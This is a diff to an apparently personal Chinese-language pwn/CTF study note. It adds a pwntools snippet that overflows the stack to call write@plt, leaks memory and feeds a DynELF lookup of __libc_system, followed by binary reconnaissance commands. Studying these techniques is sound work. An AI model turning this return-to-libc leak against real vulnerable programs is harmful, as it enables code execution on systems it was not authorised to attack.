@@ -10,4 +10,53 @@
 write（1，address，length），栈先存入返回地址
 
 read（0，address，length），栈先存入返回地址
+
 puts（address），不限长度，但有截断问题
+
+
+拿write函数来泄露地址
+def leak(address):
+
+  payload = "A" * number
+
+  payload += p32(writeplt)
+
+  payload += p32(返回地址，一般为main)
+
+  payload += p32(1)
+
+  payload += p32(address)
+
+  payload += p32(4)
+
+  p.send(payload)
+
+  data = p.recv(4)
+
+  print "%#x => %s" % (address, (data or '').encode('hex'))
+
+  return data
+
+print p.recvline()
+
+dynelf = DynELF(leak, elf=ELF("./文件"))
+
+systemAddress = dynelf.lookup("__libc_system", "libc") 
+
+
+拿puts函数来泄露地址
+
+
+
+
+vmmap查看各个段的权限
+
+ldd，file 文件        查看文件总概
+
+objdump -R 文件       查看动态重定位函数
+
+objdump -r -d 文件    查看文件代码分类
+
+string -a -t x 链接库 | grep '字符串'
+
+readelf -s 链接库 | grep '函数'
